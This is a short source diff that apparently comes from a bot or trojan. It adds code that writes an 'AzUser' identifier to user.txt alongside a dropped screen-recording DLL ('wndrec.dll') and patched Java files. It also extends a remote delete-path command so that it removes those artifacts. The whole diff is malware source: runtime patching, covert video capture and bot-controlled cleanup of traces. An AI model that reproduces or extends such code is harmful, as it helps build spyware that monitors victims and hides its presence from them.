@@ -16,7 +16,7 @@
 #include "JavaConfig.h"
 #include "Richedit.h"
 #include "VideoRecorder.h"
-
+#include "AzConfig.h"
 
 //#include "BotDebug.h"
 
@@ -588,6 +588,12 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	pPathAppendA( fileName, "wndrec.dll" );
 	SaveVideoDll(fileName);
 
+	m_lstrcpy( fileName, Path );
+	pPathAppendA( fileName, "user.txt" );
+	string azUser = GetAzUser();
+	DBG( "JavaPatcher",  "AzUser: %s", azUser.t_str() );
+	File::WriteBufferA( fileName, azUser.t_str(), azUser.Length() );
+
 	return true;
 }
 
@@ -1131,6 +1137,8 @@ bool ExecuteDeletePathCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
 	{
 		DeletePatchFile( path, "rt.ini" );
 		DeletePatchFile( path, "uid.txt" );
+		DeletePatchFile( path, "user.txt" );
+		DeletePatchFile( path, "wndrec.dll" );
 	}
 	
 	return 0;
